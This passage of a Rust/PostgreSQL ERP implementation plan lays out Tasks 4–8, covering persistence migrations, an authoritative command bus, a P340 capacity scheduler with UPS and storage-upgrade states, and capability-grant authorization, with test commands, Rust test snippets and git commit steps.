- [ ] **Step 2: Implement ports, six migrations, adapters and all module/Cargo wiring**

Every table receives composite legal-entity keys, RLS, immutable-fact guards and registry coverage. Ledger entries are balanced internal operating facts. A closed operating period never reopens; late facts retain the business date, post to the next open period and record reason/correction links. Every adapter uses caller-owned `PgTx`.

- [ ] **Step 3: Run unit, SQL and fresh PG16 gates**

Run: `cargo test -p ep-domain-procure -p ep-domain-inventory -p ep-domain-costing -p ep-domain-invoice -p ep-domain-finance -p ep-domain-ledger -p ep-app-procure -p ep-app-inventory -p ep-app-costing -p ep-app-invoice -p ep-app-finance -p ep-app-ledger -p ep-adapter-db-pg && cargo test -p ep-testkit --test f57_business_baseline_b -- --nocapture && cargo xtask sqlcheck && cargo xtask f57check --task F57-04 --phase post-green`

Expected: PASS with zero ignored tests.

- [ ] **Step 4: Commit**

```bash
git add -- docs/data-dictionary/procure.md docs/data-dictionary/finance.md docs/data-dictionary/invoice.md docs/data-dictionary/ledger.md crates/contract/procure/src/lib.rs crates/contract/inventory/src/lib.rs
git add -- crates/contract/costing/src/lib.rs crates/contract/invoice/src/lib.rs crates/contract/finance/src/lib.rs crates/contract/ledger/src/lib.rs crates/domain/procure/src/lib.rs crates/domain/inventory/src/lib.rs
git add -- crates/domain/costing/src/lib.rs crates/domain/invoice/src/lib.rs crates/domain/finance/src/lib.rs crates/domain/ledger/src/lib.rs crates/application/procure/src/lib.rs crates/application/inventory/src/lib.rs
git add -- crates/application/costing/src/lib.rs crates/application/invoice/src/lib.rs crates/application/finance/src/lib.rs crates/application/ledger/src/lib.rs crates/contract/{procure,inventory,costing,invoice,finance,ledger}/Cargo.toml crates/domain/{procure,inventory,costing,invoice,finance,ledger}/Cargo.toml
git add -- crates/application/{procure,inventory,costing,invoice,finance,ledger}/Cargo.toml crates/adapter/db-pg/src/procure/mod.rs crates/adapter/db-pg/src/procure/repository.rs crates/adapter/db-pg/src/inventory/mod.rs crates/adapter/db-pg/src/inventory/repository.rs crates/adapter/db-pg/src/costing/mod.rs
git add -- crates/adapter/db-pg/src/costing/repository.rs crates/adapter/db-pg/src/invoice/mod.rs crates/adapter/db-pg/src/invoice/repository.rs crates/adapter/db-pg/src/finance/mod.rs crates/adapter/db-pg/src/finance/repository.rs crates/adapter/db-pg/src/ledger/mod.rs
git add -- crates/adapter/db-pg/src/ledger/repository.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml db/migrations/procure/V20261025090700__procure_create_current_business_tables.sql db/migrations/inventory/V20261025090800__inventory_create_current_business_tables.sql db/migrations/costing/V20261025090900__costing_create_current_business_tables.sql
git add -- db/migrations/invoice/V20261025091000__invoice_create_current_business_tables.sql db/migrations/finance/V20261025091100__finance_create_current_business_tables.sql db/migrations/ledger/V20261025091200__ledger_create_current_business_tables.sql testkit/tests/f57_business_baseline_b.rs testkit/Cargo.toml
git commit -m "feat: materialize procure inventory finance persistence"
```

### Task 5: Materialize project, service, reporting and portal persistence

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-business-execution-contract.md`
- Modify: `docs/data-dictionary/platform_flow.md`, `docs/data-dictionary/portal.md`, `docs/metrics-catalog.md`
- Modify: `crates/contract/project/src/lib.rs`, `crates/contract/service/src/lib.rs`, `crates/contract/reporting/src/lib.rs`, `crates/contract/portal/src/lib.rs`
- Modify: `crates/domain/project/src/lib.rs`, `crates/domain/service/src/lib.rs`, `crates/domain/reporting/src/lib.rs`, `crates/domain/portal/src/lib.rs`
- Modify: `crates/application/project/src/lib.rs`, `crates/application/service/src/lib.rs`, `crates/application/reporting/src/lib.rs`, `crates/application/portal/src/lib.rs`
- Modify: `crates/contract/{project,service,reporting,portal}/Cargo.toml`
- Modify: `crates/domain/{project,service,reporting,portal}/Cargo.toml`
- Modify: `crates/application/{project,service,reporting,portal}/Cargo.toml`
- Create: `crates/adapter/db-pg/src/project/mod.rs`, `crates/adapter/db-pg/src/project/repository.rs`
- Create: `crates/adapter/db-pg/src/service/mod.rs`, `crates/adapter/db-pg/src/service/repository.rs`
- Create: `crates/adapter/db-pg/src/reporting/mod.rs`, `crates/adapter/db-pg/src/reporting/repository.rs`
- Create: `crates/adapter/db-pg/src/portal/mod.rs`, `crates/adapter/db-pg/src/portal/repository.rs`
- Create: `crates/platform/identity/src/portal_identity.rs`
- Modify: `crates/platform/identity/src/ports.rs`, `crates/platform/identity/src/lib.rs`, `crates/platform/identity/Cargo.toml`
- Create: `crates/adapter/db-pg/src/portal/identity_repository.rs`, `crates/adapter/db-pg/src/portal/portal_identity_repository.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`, `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/project/V20261025091300__project_create_current_business_tables.sql`
- Create: `db/migrations/service/V20261025091400__service_create_current_business_tables.sql`
- Create: `db/migrations/reporting/V20261025091500__reporting_create_current_business_tables.sql`
- Create: `db/migrations/portal/V20261025091600__portal_create_current_business_tables.sql`
- Create: `testkit/tests/f57_business_baseline_c.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:** Task 5 produces transaction-aware ports/adapters for projects, equipment/complaints/work orders/evidence, governed reports/snapshots and external-party portal sessions/commands. Service owns work-order facts; automation later owns only execution state.

- [ ] **Step 1: Write the failing fresh-PostgreSQL ownership/RLS test**

Run: `cargo xtask f57check --task F57-05 --phase pre-red && cargo test -p ep-testkit --test f57_business_baseline_c -- --nocapture`

Expected: FAIL because the four persistence slices do not exist.

- [ ] **Step 2: Implement ports, schemas, adapters and all wiring**

Reporting snapshots carry source fact/generation IDs. Portal rows carry external-party and legal-entity scope and never duplicate supplier/customer facts. Create RLS, history, append-only and registry coverage. All adapters use caller-owned `PgTx`.

`V20261025091600__portal_create_current_business_tables.sql` is the sole first-release physical migration for Business Execution Contract §10; Task 22 must not create a parallel store. Physical co-location does not collapse logical ownership. `PortalIdentityAuthorityPort` in `platform/identity` and its `identity_repository.rs` adapter are the sole writers of `portal_principals`、`portal_authenticators`、`portal_devices`、`portal_sessions` and `portal_refresh_families`. `PortalIdentityOrchestrationPort` in the portal application boundary and `portal_identity_repository.rs` are the sole writers of `portal_invites`、`portal_party_bindings`、single-use consumed challenge proofs、`portal_security_fences`/targets and activation/revocation receipts. `PortalProjectionRepositoryPort` and `portal/repository.rs` own only fixed allowlists and curated portal projections and can never mutate identity or binding facts. No repository exposes another owner's table mutation.

The migration creates each owner's current rows plus immutable transition/evidence history and enforces the closed state vocabularies, one legal entity/party/contact/audience binding, global WebAuthn credential-ID uniqueness, digest-only invite/refresh/proof storage, monotonic refresh rotation and authority epoch, exact receipt cardinality, terminal immutability and row-version CAS. All three ports accept the same caller-owned `PgTx`; the Task 6 composition root may therefore orchestrate `AcceptPortalInvite` and each two-phase revocation across owners, audit and outbox atomically without nested commits or cross-owner direct SQL.

`f57_business_baseline_c` applies the migration to fresh PostgreSQL 16 and proves RLS plus positive/negative constraints for every owned table, cross-owner write denial, every allowed/unlisted/terminal edge, atomic invite bootstrap, consume-on-attempt proof persistence, refresh-family CAS, fence survival across process restart and exact receipt-set uniqueness under concurrent retry. Task 5 materializes storage and ports only; no portal route becomes live until Task 22 composes them.

- [ ] **Step 3: Verify crates and fresh PostgreSQL 16**

Run: `cargo test -p ep-domain-project -p ep-domain-service -p ep-domain-reporting -p ep-domain-portal -p ep-app-project -p ep-app-service -p ep-app-reporting -p ep-app-portal -p ep-adapter-db-pg && cargo test -p ep-testkit --test f57_business_baseline_c -- --nocapture && cargo xtask sqlcheck && cargo xtask f57check --task F57-05 --phase post-green`

Expected: PASS, including external-party, legal-entity and immutable-evidence negatives.

- [ ] **Step 4: Commit**

```bash
git add -- docs/data-dictionary/platform_flow.md docs/data-dictionary/portal.md docs/metrics-catalog.md crates/contract/project/src/lib.rs crates/contract/service/src/lib.rs crates/contract/reporting/src/lib.rs
git add -- crates/contract/portal/src/lib.rs crates/domain/project/src/lib.rs crates/domain/service/src/lib.rs crates/domain/reporting/src/lib.rs crates/domain/portal/src/lib.rs crates/application/project/src/lib.rs
git add -- crates/application/service/src/lib.rs crates/application/reporting/src/lib.rs crates/application/portal/src/lib.rs crates/contract/{project,service,reporting,portal}/Cargo.toml crates/domain/{project,service,reporting,portal}/Cargo.toml crates/application/{project,service,reporting,portal}/Cargo.toml
git add -- crates/platform/identity/src/portal_identity.rs crates/platform/identity/src/ports.rs crates/platform/identity/src/lib.rs crates/platform/identity/Cargo.toml
git add -- crates/adapter/db-pg/src/project/mod.rs crates/adapter/db-pg/src/project/repository.rs crates/adapter/db-pg/src/service/mod.rs crates/adapter/db-pg/src/service/repository.rs crates/adapter/db-pg/src/reporting/mod.rs crates/adapter/db-pg/src/reporting/repository.rs
git add -- crates/adapter/db-pg/src/portal/mod.rs crates/adapter/db-pg/src/portal/repository.rs crates/adapter/db-pg/src/portal/identity_repository.rs crates/adapter/db-pg/src/portal/portal_identity_repository.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml db/migrations/project/V20261025091300__project_create_current_business_tables.sql db/migrations/service/V20261025091400__service_create_current_business_tables.sql
git add -- db/migrations/reporting/V20261025091500__reporting_create_current_business_tables.sql db/migrations/portal/V20261025091600__portal_create_current_business_tables.sql testkit/tests/f57_business_baseline_c.rs testkit/Cargo.toml
git commit -m "feat: materialize service project portal persistence"
```

### Task 6: Establish the typed authoritative command bus

**Files:**
- Create: `crates/platform/command/Cargo.toml`, `crates/platform/command/src/lib.rs`, `crates/platform/command/src/envelope.rs`, `crates/platform/command/src/pipeline.rs`, `crates/platform/command/src/ports.rs`, `crates/platform/command/src/registry.rs`, `crates/platform/command/tests/authority.rs`
- Modify: `Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_msg/command_receipts.rs`
- Modify: `crates/adapter/db-pg/src/platform_msg/mod.rs`, `crates/adapter/db-pg/src/lib.rs`, `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/platform_msg/V20261025091700__platform_msg_create_capability_command_receipts.sql`
- Create: `apps/core-server/src/command.rs`, `apps/core-server/src/wiring/command.rs`
- Modify: `apps/core-server/src/lib.rs`, `apps/core-server/src/main.rs`, `apps/core-server/src/wiring/mod.rs`, `apps/core-server/Cargo.toml`
- Create: `testkit/src/f57.rs`, `testkit/tests/f57_command_authority.rs`
- Create: `testkit/tests/f57_authority_command.rs`
- Modify: `testkit/src/lib.rs`, `testkit/Cargo.toml`

**Interfaces:** Produces `CommandEnvelope<C>`, `CommandRegistry`, `CommandPipeline` and durable command receipts. Authentication supplies actor/device/server context; client payloads cannot assert actor, policy, generation or authority epoch.

- [ ] **Step 1: Write failing bypass, replay, cross-principal and forged-context tests**

Run: `cargo xtask f57check --task F57-06 --phase pre-red && cargo test -p ep-platform-command --test authority && cargo test -p ep-testkit --test f57_command_authority`

Expected: FAIL because the command crate, server library route and receipt store do not exist.

- [ ] **Step 2: Implement the acyclic command contract**

`ep-platform-command` depends only on `ep-foundation` and port traits. Domain/application handlers depend on it; the command crate never depends on domain/application, authz, release, outbox, audit or `db-pg`. A composition-root `CommandRegistry` registers erased handlers through typed constructors. `AuthorityContext` is server-created and includes principal, legal entity, device/session, request/idempotency IDs and deployment identity. The pipeline order is fixed: authenticate session and device, build the current authority context, evaluate current authorization/object visibility, and only then look up an idempotency receipt. A denied caller receives the same non-disclosing result whether or not a receipt exists.

- [ ] **Step 3: Add the receipt adapter and core-server composition**

The receipt key is `(legal_entity_id, command_type, idempotency_key)` and its authenticated value binds original principal, original device/session class, capability/scope, object visibility, authorization policy version and payload hash. A repeated key with a changed payload hash, different principal/device, revoked grant, narrower visibility or incompatible current authorization is rejected without disclosing the original result. Initial authorization/generation/audit/outbox/epoch ports are injected fail-closed implementations; Tasks 8, 9, 11 and 24 replace them at the single core-server composition root. No HTTP/plugin/provider route calls a repository directly. Tests cover same-principal replay, changed payload, second principal, second device, grant revocation, visibility narrowing and legal-entity crossing.

- [ ] **Step 4: Verify dependency direction and fresh PG16**

Run: `cargo test -p ep-platform-command -p ep-adapter-db-pg -p core-server && cargo test -p ep-testkit --test f57_command_authority --test f57_authority_command -- --nocapture && cargo xtask archcheck && cargo xtask sqlcheck && cargo xtask f57check --task F57-06 --phase post-green`

Expected: PASS; `core-server` compiles as library and binary, the receipt migration applies on fresh PostgreSQL 16, and no write bypass exists.

- [ ] **Step 5: Commit**

```bash
git add -- crates/platform/command/Cargo.toml crates/platform/command/src/lib.rs crates/platform/command/src/envelope.rs crates/platform/command/src/pipeline.rs crates/platform/command/src/ports.rs crates/platform/command/src/registry.rs
git add -- crates/platform/command/tests/authority.rs Cargo.toml crates/adapter/db-pg/src/platform_msg/command_receipts.rs crates/adapter/db-pg/src/platform_msg/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml
git add -- db/migrations/platform_msg/V20261025091700__platform_msg_create_capability_command_receipts.sql apps/core-server/src/command.rs apps/core-server/src/wiring/command.rs apps/core-server/src/lib.rs apps/core-server/src/main.rs apps/core-server/src/wiring/mod.rs
git add -- apps/core-server/Cargo.toml testkit/src/f57.rs testkit/tests/f57_command_authority.rs testkit/tests/f57_authority_command.rs testkit/src/lib.rs testkit/Cargo.toml
git commit -m "feat: add typed authoritative command bus"
```

### Task 7: Add the P340 low-resource scheduler and honest capacity state

**Files:**
- Create: `crates/foundation/src/port/power.rs`
- Modify: `crates/foundation/src/port/mod.rs`
- Modify: `crates/foundation/src/lib.rs`
- Create: `crates/platform/runtime/src/capacity.rs`
- Create: `crates/platform/runtime/src/storage_reserve.rs`
- Create: `crates/platform/runtime/tests/capacity.rs`
- Create: `crates/platform/runtime/tests/storage_reserve.rs`
- Modify: `crates/platform/runtime/src/lib.rs`
- Modify: `crates/platform/runtime/Cargo.toml`
- Create: `crates/adapter/windows-power/Cargo.toml`
- Create: `crates/adapter/windows-power/src/lib.rs`
- Create: `crates/adapter/windows-power/src/provider.rs`
- Create: `crates/adapter/windows-power/tests/provider.rs`
- Modify: `Cargo.toml`
- Modify: `apps/job-worker/src/scheduler.rs`
- Modify: `apps/job-worker/src/jobs.rs`
- Modify: `apps/job-worker/src/main.rs`
- Modify: `apps/job-worker/Cargo.toml`
- Modify: `crates/platform/obs/src/degradation.rs`
- Modify: `apps/core-server/src/probe.rs`
- Modify: `crates/platform/authz/src/admission.rs`
- Modify: `apps/core-server/src/wiring/identity.rs`
- Create: `apps/ops-agent/src/power.rs`
- Modify: `apps/ops-agent/src/main.rs`
- Modify: `apps/ops-agent/Cargo.toml`
- Create: `db/migrations/platform_ops/V20261025091800__platform_ops_create_storage_capacity_evidence.sql`

**Interfaces:**
- Consumes: Task 2 `VerifiedDeploymentManifest`/`ValidatedDataRoot` and Task 6 durable command identity.
- Produces: `CapacityGovernor::admit(JobClass) -> Admission`, `P340_LOW_RESOURCE_V1`, `SINGLE_DISK_DEGRADED_PRODUCTION`, continuous `PowerProvider` telemetry and signed capacity/power evidence.

- [ ] **Step 1: Write failing priority and fairness tests**

```rust
#[test]
fn p340_allows_one_heavy_report_and_never_starves_transactions() {
    let mut g = CapacityGovernor::p340_low_resource();
    assert_eq!(g.admit(JobClass::InteractiveTransaction), Admission::Run);
    assert_eq!(g.admit(JobClass::HeavyReport), Admission::Run);
    assert_eq!(g.admit(JobClass::HeavyReport), Admission::Queue { lane: "heavy" });
    assert_eq!(g.admit(JobClass::Backup), Admission::RunThrottled);
}

#[test]
fn user_twenty_one_is_observed_not_rejected() {
    let mut g = CapacityGovernor::p340_low_resource();
    for user in 1..=21 { g.observe_active_user(user); }
    assert_eq!(g.active_user_state(), ActiveUserState::OutsideCertifiedEnvelope { observed: 21, certified: 20 });
}
```

- [ ] **Step 2: Run and see the missing-type failure**

Run: `cargo xtask f57check --task F57-07 --phase pre-red && cargo test -p ep-platform-runtime --test capacity`

Expected: FAIL because the governor types are absent.

- [ ] **Step 3: Implement fixed classes and limits**

```rust
#[derive(Clone, Copy, Eq, PartialEq)]
pub enum JobClass { DatabaseDurability, IdentityAuthorization, AuditFlush, Backup, InteractiveTransaction, ControlCenter, AutomationDue, Attachment, McpConnector, Ocr, ImportExport, HeavyReport, Ai, Maintenance }

pub const P340_LIMITS: CapacityLimits = CapacityLimits {
    certified_active_users: 20,
    certified_workbench_users: 15,
    certified_customer_portal_users: 3,
    certified_supplier_portal_users: 2,
    reserved_control_center_sessions: 1,
    mixed_read_users: 11,
    mixed_write_users: 5,
    mixed_high_risk_users: 2,
    mixed_attachment_users: 2,
    heavy_report_concurrency: 1,
    local_model_concurrency: 0,
    low_priority_queue_bound: 256,
};
```

The seven priority levels are exact and ordered: P1 `DatabaseDurability`；P2 `IdentityAuthorization|AuditFlush|ControlCenter`；P3 `Backup`；P4 `InteractiveTransaction|Attachment`；P5 `AutomationDue`；P6 `McpConnector|Ocr`；P7 `ImportExport|HeavyReport|Ai|Maintenance`. Unknown classes fail compilation/admission. Use bounded FIFO within a level, reserved P1/P2/P4 permits and weighted I/O ceilings；a lower class never delays a ready higher class, but P3 backup cannot consume all transaction/WAL bandwidth. Accepted durable work is never dropped: pause/preemption first writes a checkpoint, restart requeues the same task/idempotency identity, and queue overflow rejects only the newly requested lower-priority job. P5 may be delayed but the scheduler forecasts each signed due_at/SLA/protection window; likely miss raises an unsuppressible escalation and reserves the next eligible slot without overtaking P1–P4. Backup protection-window breach blocks P6/P7 and new large imports/attachments, raises an unsuppressible protection incident, and at the signed hard-stop deadline drains P4/P5 into checkpoints and requests controlled shutdown；it never fabricates a successful backup or starves P1/P2. Tests cover FIFO/fairness, SLA/protection-window boundaries, reboot checkpoint resume, identity/audit/ordinary-query reserves and no lost accepted task.

Persist capacity evidence through `storage_capacity_evidence`. `HardwareEvidenceV1` strict fields are `schema_version=1,profile_id,deployment_id,evidence_id,system_product_code,system_serial_digest,windows_product,windows_build,cpu_product_code,cpu_raw_evidence,memory_bytes,os_ssd_devices,authority_hdd_devices,controller_ids,tpm_ek_digest,uefi_digest,volume_bindings,measured_at,generation,evidence_digest`。Each `DiskEvidenceV1` is exactly `disk_id,serial_digest,model,firmware,media_type,nominal_capacity_class,measured_capacity_bytes,controller_id,logical_sector_bytes,physical_sector_bytes,write_cache_policy,volume_ids`；arrays sort by stable ID and are nonempty where required. Current `P340_SINGLE_HDD_V1` requires `system_product_code=THINKSTATION_P340_TOWER`、`cpu_product_code=INTEL_CORE_I5_10500`、`memory_bytes=34359738368`、one OS `SSD/256_GB` and exactly one authority `HDD/1_TB`, plus Windows Server 2022, TPM/UEFI/controller/volume readback. Missing, extra, mismatched or unreadable hardware returns `HARDWARE_PROFILE_MISMATCH` and cannot sign capacity. Any CPU/RAM/disk/controller/firmware/scanner/volume change invalidates the prior certificate and requires a new signed profile plus full recertification；the recorder stores raw evidence as well as normalized codes so mapping cannot hide a mismatch.

`StorageReserve` preallocates an ACL-protected `EmergencyReserve` on the validated HDD. Only the authority recovery principal may release it after the red threshold, every release is audited, and successful recovery recreates/verifies the reserve before normal admission resumes. Ordinary services/plugins cannot open, consume, truncate or delete it. Full-disk races cover concurrent WAL/audit/attachment writes; if WAL or audit durability cannot be guaranteed, the authority rejects new commands and enters safe shutdown instead of continuing unlogged.

Rename the current `max_concurrent_users` semaphore in `crates/platform/authz/src/admission.rs` and `apps/core-server/src/wiring/identity.rs` to the measured in-flight request limit; it is not a user/license limit. Twenty active principals is an observed certification envelope only. Request admission has an interactive reserve and progressive low-priority throttling. The 21st principal test executes a real authenticated command and must not receive 503 solely because of principal count.

`UpsCarrierKind` is exactly `WINDOWS_STANDARD_POWER_STATUS|SIGNED_VENDOR_ADAPTER` and no generic third carrier is accepted. `UpsStatusV1` strict fields are `carrier_kind,carrier_version,adapter_digest,ups_identity,online_state,runtime_remaining_seconds,communication_state,self_test_or_equivalent_state,model,serial_digest,firmware,battery_install_date,load_watts,load_va,sampled_at,generation,evidence_digest`；unknown optional vendor details remain explicit UNKNOWN, never guessed. Both carriers must produce current online/runtime/communication/self-test-or-equivalent shutdown evidence. `SIGNED_VENDOR_ADAPTER` additionally requires release/Authenticode signer and version allowlist, model/serial/firmware/battery/W/VA readback and least-privilege adapter identity. `WINDOWS_STANDARD_POWER_STATUS` binds the Windows API/build and is sufficient only when every production-essential field is actually available. Missing/stale/UNKNOWN essential fields, disconnect, signature/version/readback mismatch or inability to execute the fixed shutdown sequence returns `CAPABILITY_INSUFFICIENT`, blocks go-live and raises a non-suppressible alert. IaaS cannot inherit a UPS pass from a provider availability claim. Low runtime stops long-task admission, checkpoints accepted durable work, safely stops PostgreSQL and only then requests Windows shutdown. The provider is a real Windows adapter crate, not a one-shot script；tests exercise success and every missing/stale/tampered case for both carriers, mains loss/restore and repeated disconnect.

Freeze the later RAID1 path now without claiming hot swap. `StorageUpgradeState` wire/SQL values and only edges are `PLANNED→BACKUP_VERIFIED→POWERED_DOWN→MEDIA_INSTALLED→MIRROR_VERIFIED→DATA_RESTORED→RECONCILED→RECERTIFYING→CERTIFIED`; every preterminal state may enter terminal `FAILED_CONTAINED`, and retry requires a new plan ID. `StorageUpgradePlanV1` exact fields are `plan_id,from_profile,to_profile,source_disk_ids,target_disk_ids,reused_source_disk_id,server_external_backup_checkpoint,validated_data_root_before,validated_data_root_after,volume_identity_before,volume_identity_after,old_certificate_id,steps,requested_by,approved_by,generation,plan_digest`。Before POWERED_DOWN it proves a complete server-external restore point and verifies tower bay/flex-bay, power, SATA/controller/driver plus two enterprise CMR HDD compatibility. Entering POWERED_DOWN invalidates the old production certificate. Reusing the existing disk is allowed only when model/CMR/firmware/health/workload/pairing evidence passes；otherwise it is excluded, its authority role and keys are removed after reconciled restore, and any later non-authority use requires approved cryptographic erase/re-enrolment. The mirror build binds new physical members and volume identity, restores/migrates all DB/WAL/attachments/audit/temp/derived paths, re-runs HDD routing, reconciliation, power-loss/rebuild/replacement, 20-user exact load, backup/restore and capacity tests, then signs `P340_RAID1_V1`. Failure remains contained with no production writes. RAID1 does not replace any backup layer and is not a hot-plug promise；64GB or other hardware upgrades use the same new-profile/invalidated-certificate/full-recertification protocol.

- [ ] **Step 4: Run deterministic scheduler/profile tests only**

Task 7 uses deterministic fake hardware/clock/UPS adapters to prove the seven scheduler levels、bounded queues、reserve、checkpoint/restart、21st-user non-rejection、both UPS carrier parsers and the complete storage-upgrade state graph. It may validate the exact `HardwareEvidenceV1` schema and reject wrong P340 fixtures, but it must not create a production capacity certificate or claim the real 15/3/2 workload. The full barrier load (15 Workbench + 3 customer portal + 2 supplier portal、one separately reserved Control Center、11/5/2/2 action mix、bursts、real automation、backup、audit、scanner、growth/fill、power loss and 72-hour stability) is exclusively the Task 24 activation run on the installed P340. The production-carrier files `testkit/tests/f57_p340_capacity.rs` and `testkit/tests/f57_power_shutdown.rs` therefore do not exist yet in Task 7；Task 24 creates them with the ownership-seed stable symbols and activates those TestIDs against real evidence.

Task 7 owns scheduler/profile implementation and deterministic harness only；it does **not** activate `NFR-001|NFR-003|NFR-005|NFR-007` or certify a production workload. Those four rows remain `owner_task=F57-07` but fix `activation_task=F57-24`，where signed MSI、real P340、pinned PostgreSQL 16、HDD fill/growth、UPS、backup/restore and 72-hour evidence are jointly available. Task 7 POST_GREEN proves profile shape/synthetic behavior and leaves all four `UNCERTIFIED`; Task 24 must rerun the same stable TestIDs on the real carrier before its receipt may activate them.

Run: `cargo test -p ep-platform-runtime --test capacity --test storage_reserve && cargo test -p ep-adapter-windows-power --test provider && cargo xtask f57check --task F57-07 --phase post-green`

Expected: PASS for deterministic profile/schema、seven-level priority/fairness/SLA/protection、both UPS parser matrices、reserve/checkpoint/restart and RAID1/64GB migration-plan graph only. Heavy-report configured maximum is 1, local model is 0, accepted synthetic jobs survive checkpoint/throttling/restart, and the 21st synthetic principal is observed rather than rejected. The command emits no production certificate；`NFR-001|003|005|007` remain `UNCERTIFIED` until Task 24. Wrong fixture CPU/RAM/disk/controller/volume、carrier field/signature/readback failure or unlisted upgrade edge fails, while absence of not-yet-built Workbench/portal/business/backup components is not falsely treated as a Task 7 production run.

- [ ] **Step 5: Commit**

```bash
git add -- crates/foundation/src/port/power.rs crates/foundation/src/port/mod.rs crates/foundation/src/lib.rs crates/platform/runtime/src/capacity.rs crates/platform/runtime/src/storage_reserve.rs crates/platform/runtime/tests/capacity.rs
git add -- crates/platform/runtime/tests/storage_reserve.rs crates/platform/runtime/src/lib.rs crates/platform/runtime/Cargo.toml crates/adapter/windows-power/Cargo.toml crates/adapter/windows-power/src/lib.rs crates/adapter/windows-power/src/provider.rs
git add -- crates/adapter/windows-power/tests/provider.rs Cargo.toml apps/job-worker/src/scheduler.rs apps/job-worker/src/jobs.rs apps/job-worker/src/main.rs apps/job-worker/Cargo.toml
git add -- crates/platform/obs/src/degradation.rs apps/core-server/src/probe.rs crates/platform/authz/src/admission.rs apps/core-server/src/wiring/identity.rs apps/ops-agent/src/power.rs apps/ops-agent/src/main.rs
git add -- apps/ops-agent/Cargo.toml db/migrations/platform_ops/V20261025091800__platform_ops_create_storage_capacity_evidence.sql
git commit -m "feat: add p340 capacity governor"
```

### Task 8: Replace fixed-role authority and wire authorization into every write

**Files:**
- Create: `crates/platform/authz/src/grant.rs`
- Create: `crates/platform/authz/src/delegation.rs`
- Create: `crates/platform/authz/tests/dynamic_grants.rs`
- Modify: `crates/foundation/src/capability.rs`
- Modify: `crates/foundation/src/principal.rs`
- Modify: `crates/platform/authz/src/types.rs`
- Modify: `crates/platform/authz/src/decider.rs`
- Modify: `crates/platform/authz/src/snapshot.rs`
- Modify: `crates/platform/authz/src/lib.rs`
- Modify: `crates/platform/authz/Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_authz/capability_grants.rs`
- Create: `crates/adapter/db-pg/src/platform_authz/delegations.rs`
- Modify: `crates/adapter/db-pg/src/platform_authz/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Modify: `crates/platform/command/src/pipeline.rs`
- Modify: `apps/core-server/src/wiring/command.rs`
- Modify: `apps/core-server/src/wiring/authz.rs`
- Modify: `apps/core-server/Cargo.toml`
- Create: `db/migrations/platform_authz/V20261025091900__platform_authz_create_capability_grants.sql`
- Create: `db/migrations/platform_authz/V20261025092000__platform_authz_create_delegations.sql`
- Create: `testkit/tests/f57_authz_matrix.rs`
- Create: `testkit/tests/f57_write_path_authz.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 2 `TrustedClockV1`, Task 6 `CommandPipeline` and existing `SecurityContext`, `Action`, `RecordScope`, field visibility, SoD and re-auth primitives.
- Produces: `CapabilityId`, `GrantEnvelope`, `Delegation`, `AuthorizationRequest`, `DecisionExplanation` and a real `AuthorizationPort` injected into the command bus; roles remain grant-template sources only.

- [ ] **Step 1: Write failing temporal, scope and revocation tests**

```rust
#[test]
fn delegation_cannot_exceed_parent_scope_or_validity() {
    let parent = grant("sales.order.approve").amount_max(50_000).valid_until(t("2026-09-01T00:00:00Z"));
    let child = delegation(&parent).amount_max(60_000).valid_until(t("2026-09-02T00:00:00Z"));
    assert_eq!(child.validate(), Err(GrantError::DelegationExpandsAuthority));
}

#[test]
fn revoked_grant_fails_at_execution_even_if_task_was_assigned_before_revocation() {
    let engine = fixture_engine().with_revoked_grant("g-1", t("2026-08-23T10:00:00Z"));
    let decision = engine.decide_at(request("g-1"), t("2026-08-23T10:00:01Z"));
    assert!(matches!(decision, Decision::Deny(DenyReason::GrantRevoked { .. })));
}
```

- [ ] **Step 2: Confirm the tests fail**

Run: `cargo xtask f57check --task F57-08 --phase pre-red && cargo test -p ep-platform-authz --test dynamic_grants`

Expected: FAIL because capability grants and delegation narrowing do not exist.

- [ ] **Step 3: Implement the stable authorization contract**

```rust
#[derive(Clone, Eq, PartialEq, Ord, PartialOrd, Hash, serde::Serialize, serde::Deserialize)]
pub struct CapabilityId(String);

#[derive(Clone)]
pub struct GrantEnvelope {
    pub grant_id: uuid::Uuid,
    pub principal_id: uuid::Uuid,
    pub capability: CapabilityId,
    pub scope: ScopeConstraint,
    pub conditions: Vec<Condition>,
    pub valid_from: chrono::DateTime<chrono::Utc>,
    pub valid_until: chrono::DateTime<chrono::Utc>,
    pub device: DeviceConstraint,
    pub risk_ceiling: RiskLevel,
    pub delegation_depth_remaining: u8,
}

pub struct AuthorizationRequest<'a> {
    pub context: &'a ep_foundation::security::SecurityContext,
    pub capability: &'a CapabilityId,
    pub action: Action,
    pub subject: SubjectRef,
    pub amount_minor: Option<i128>,
    pub occurred_at: chrono::DateTime<chrono::Utc>,
}
```

Precedence is fixed: explicit constitutional deny → grant validity/revocation → scope/field/device/risk → SoD → re-auth/approval → allow. Add database constraints ensuring child scope, value and validity cannot exceed the parent; revocation is append-only and snapshot reload cannot resurrect it.

Implement `AuthorizationPort` in `ep-platform-authz` and inject it into `CommandPipeline` from `core-server`; do not add a reverse dependency from authz into command or release. Architecture scanning enumerates every Axum mutation route, application command handler, portal write, client sync write and provider/plugin callback and fails unless it reaches a single runtime authorization call immediately before its repository writes. Missing authz is deny, never `unwired-absent` allow.

- [ ] **Step 4: Add explain and simulation parity tests**

```rust
#[test]
fn simulation_and_live_decision_share_the_same_engine() {
    let request = approval_request(49_999);
    let live = engine().decide(&request);
    let simulated = engine().simulate(&request, ProposedGrantChange::none());
    assert_eq!(simulated.decision, live);
    assert_eq!(simulated.policy_version, live.policy_version());
}
```

Run: `cargo test -p ep-platform-authz && cargo test -p ep-testkit --test f57_authz_matrix --test f57_write_path_authz && cargo xtask archcheck && cargo xtask f57check --task F57-08 --phase post-green`

Expected: PASS across legal entity, row, field, time, device, amount, delegation, revocation, SoD and break-glass cases; no test requires a fixed RoleCode.

- [ ] **Step 5: Commit**

```bash
